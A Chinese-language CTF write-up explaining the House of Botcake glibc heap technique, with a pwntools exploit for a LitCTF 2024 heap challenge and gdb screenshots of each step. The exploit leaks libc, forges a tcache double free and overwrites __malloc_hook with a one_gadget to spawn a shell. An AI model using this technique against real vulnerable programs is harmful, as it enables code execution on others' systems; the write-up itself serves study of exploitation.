---
title: House of Botcake
date: '2025-02-21 11:00:29'
updated: '2025-04-07 21:39:55'
---
随着<font style="color:rgb(26, 26, 26);">在 2.29/2.27 高版本之后，glibc 为了防止攻击者简单的 Tcache Double Free，引入了对 Tcache Key 的检查。</font>

<font style="background-color:#FBDE28;">当 free 掉一个堆块进入 tcache 时，假如堆块的 bk 位存放的 </font>`<font style="background-color:#FBDE28;">key == tcache_key </font>`<font style="background-color:#FBDE28;">， 就会</font>**<font style="background-color:#FBDE28;">遍历这个大小</font>**<font style="background-color:#FBDE28;">的 Tcache ，假如发现同地址的堆块，则触发 Double Free 报错。</font>

<font style="color:rgb(26, 26, 26);">从攻击者的角度来说，我们如果想继续利用 Tcache Double Free 的话，一般可以采取以下的方法：</font>

1. <font style="color:rgb(26, 26, 26);">破坏掉被 free 的堆块中的 key，绕过检查（常用）</font>
2. <font style="color:rgb(26, 26, 26);">改变被 free 的堆块的大小，遍历时进入另一 idx 的 entries</font>
3. <font style="color:rgb(26, 26, 26);">House of botcake（常用）</font>

<font style="color:rgb(26, 26, 26);">House of botcake 合理利用了 Tcache 和 Unsortedbin 的机制，同一堆块第一次 Free 进 Unsortedbin 避免了 key 的产生，第二次 Free 进入 Tcache，让高版本的 Tcache Double Free 再次成为可能。</font>

> <font style="color:rgb(26, 26, 26);">此外 House of botcake 在条件合适的情况下，极其容易完成多次任意分配堆块，是相当好用的手法。</font>
>

## <font style="color:rgb(26, 26, 26);">利用过程</font>
连续 malloc 9块大于 fastbin chunk 大小的堆块，然后释放7块填充 tcachebin

![](/images/5875378fed63dd6787593dba962794e9.png)

 然后释放chunk8、chunk9，会落入 unsortedbin 并进行合并

> 别忘了如果 chunk9 和 topchunk 相邻会被合并，得多申请一个 chunk 来隔开
>

![](/images/df1d27846d8d55e23e8bdaf7b7d56487.png)

这时候我们将一块 0x100 大小的 chunk 申请出来，然后再 free 掉 chunk9

![](/images/c63ffad0c2946364ab12ff5f39fd1b30.png)

 ok，现在你可能发现已经构成了double free 了，只要我们申请不是 0x100 大小的 chunk，就会从 unsortedbin 中进行切割。因此我们实际上是可以分一次或多次，将 chunk9 的一部分或全部申请出来。

合并后的 unsortedchunk：

![](/images/a18b4d386b14893b0d377a940b9552f4.png)

用空字节覆盖前面的部分到了 size 域再用 p64()把要填的数据填进去，size 要注意，然后就是把 fd 覆盖

---

看了上面的资料就很清楚了

## LitCTF 2024 heap2.31
> 题目可以直接用 UAF 搞定的
>

先看 exp：

```shell
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'
link=process("./heap2.31")
libc=ELF('./glibc/2.31-0ubuntu9_amd64/libc-2.31.so')

def gdb_attach():
	gdb.attach(link,"set solib-search-path /home/pwner/FocusingCTF/glibc/2.31-0ubuntu9_amd64/")
	pause()

def create(idx,size):
	...

def delete(idx):
	...

def show(idx):
	...

def edit(idx,content):
	...

ogg=[0xe6aee,0xe6af1,0xe6af4]

create(0,1280) #unsorted
for i in range(7):
	create(i+1,0x90) #申请够填满tcachebin的chunk
create(8,0x90) 
create(9,0x90) 
create(10,0x90) #防止topchunk合并

delete(0) #unsorted
show(0) #unsorted
malloc_hook=u64(link.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))-0x70
print(hex(malloc_hook))
libc_base=malloc_hook-libc.sym[b'__malloc_hook']
print(hex(libc_base))

for i in range(7):
	delete(i+1) #填满tcachebin
delete(9)
delete(8) #让8、9进unsortedbin被合并
create(11,0x90) #从tcache中取一个出来
delete(9)
# gdb_attach()
create(12,0x100)
payload=b'\0'*0x90+p64(0)+p64(0xa1)+p64(malloc_hook)
edit(12,payload)
create(13,0x90)
create(14,0x90) #malloc_hook
edit(14,p64(libc_base+ogg[1]))
# gdb_attach()
create(15,0x90)

link.interactive()
```

### 动调过程
在看完资料知道原理之后直接动调（因为堆题刚开始所有原理都是看资料来的，感觉还是动调看看实际的过程跟原理联系来看更方便记忆），有几个重点想调试看看的地方：

1. 先看了看 tcachebin 被填满之后接着 free 会到哪里：

```shell
create(0,1280) #unsorted
for i in range(7):
	create(i+1,0x90) #申请够填满tcachebin的chunk
create(8,0x90) 
create(9,0x90) 
create(10,0x90) #防止topchunk合并

...

for i in range(7):
	delete(i+1) #填满tcachebin
delete(9)
gdb_attach()
```

可以看到是到了 unsortedbin 里面

![](/images/e366dc5b5dd5c15b9d039e3c3cecd24d.png)



2. 又看了看 unsortedbin 里面两个连着的 chunk 是不是被合并了：

接着上面截图那里可以看到现在 unsortedbin 链表头是 chunk9（0x55fb5ald3ca0）

再把 chunk8 也释放到 unsortedbin 里面

```shell
delete(8)
```

在这一句后面看 gdb：

![](/images/4e3745809cada7c39d869a9dceaedf87.png)

可以看到被合并成一个 chunk 了，可是为什么地址更小了...（刚开始没反应过来合并了...）

原来是因为先释放的是 chunk9，地址更高，而后面才释放 chunk8，chunk8 的地址比较低，合并完之后的 chunk 的地址就是 chunk8 的地址

![](/images/a8e03f33e65329832c33dade3941f259.png)



3. 接下来是看关键的 doublefree 有没有成功把 chunk9 放到 tcachebin 里面：

```shell
create(11,0x90) #从tcache中取一个出来
delete(9)
gdb_attach()
```

![](/images/ad19e441d57ebb475e33f316ba17d643.png)

成功把这个 chunk9 放到 tcachebin 里面了



4. 然后是再申请一个比 chunk8 要大的内存，把合并后的 chunk 分割申请出来，能够覆盖到 chunk9 的 fd 改成 malloc_hook 的地址

```shell
create(12,0x100)
payload=b'\0'*0x90+p64(0)+p64(0xa1)+p64(malloc_hook)
edit(12,payload)
gdb_attach()
```

![](/images/dd0b3d605d8fc5c5a2d47e7fbc513609.png)

框住这里被覆盖成了malloc_hook 的地址，这个地址 0x55fb5ald3cb0 就是 chunk9 的地址

接下来的就很简单了，直接申请出 tcachebin 里面的 chunk9，再申请出来 malloc_hook 的内存

edit 成 one_gadget 就可以了

